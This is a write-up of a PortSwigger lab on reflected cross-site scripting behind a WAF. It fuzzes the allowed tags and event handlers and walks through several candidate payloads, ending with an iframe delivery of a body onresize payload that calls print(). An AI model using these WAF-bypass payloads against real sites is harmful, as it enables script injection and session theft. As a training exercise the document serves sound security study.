
# Reflected XSS into HTML context with most tags and attributes blocked

This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.

To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the print() function.

Note: Your solution must not require any user interaction. Manually causing print() to be called in your own browser will not solve the lab.

---------------------------------------------

References: 

- https://portswigger.net/web-security/cross-site-scripting/exploiting

- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

---------------------------------------------

The search term is reflected inside an `h1` HTML element:



**Pic 1**



Testing an `h1` tag shows that the filter blocks it:



**Pic 2**


The `h2` tag is treated differently and is not blocked in the same way:



**Pic 3**


This payload is accepted and produces the expected HTML:

```
<h3>a</h3>
```



**Pic 4**


Adding an event attribute with this payload results in an “Attribute is not allowed” message:

```
<h3 onerror=alert(1)>a</h3>
```



**Pic 5**


I tested event-handler names with Intruder, using the PortSwigger XSS cheat sheet as the reference:



**Pic 6**


The tests identified these event handlers as accepted:
- onbeforeinput
- onratechange
- onscrollend
- onresize



**Pic 7**


I repeated the tag tests using Intruder's Battery Ram attack type:



**Pic 8**


The tests identified these event handlers as accepted:
- custom tags
- body



**Pic 9**



The cheat sheet provides the following details about these attributes:


**Pic 10**
**Pic 11**
**Pic 12**
**Pic 13**



Three candidate payloads remain. Since the `audio` and `video` tags are unavailable, the `onratechange` handler cannot be used:

```
<xss contenteditable onbeforeinput=alert(1)>test
<xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></xss>
<body onresize="print()">
```


For the `onscrollend` variant, the payload was adjusted because `br` and `span` are blocked. Scrolling to the top or bottom is required for the event to fire:

```
<xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><h2>a</h2><h3 id=x>test</h3></h3>
```



**Pic 14**


The `onbeforeinput` variant requires interaction: click the text and modify it to trigger the event:

```
<xss contenteditable onbeforeinput=alert(1)>test</xss>
```



**Pic 15**



The third option is valid, but it depends on the browser tab being resized:

```
<body onresize="print()">
```



**Pic 16**



The final payload is placed inside an iframe as shown below:

```
https://0ad100ff04e7e76582e088af00ae0026.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E
```

```
<iframe src="https://0ad100ff04e7e76582e088af00ae0026.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E" height="100%" title="Iframe Example" onload=body.style.width='100%'></iframe>
```
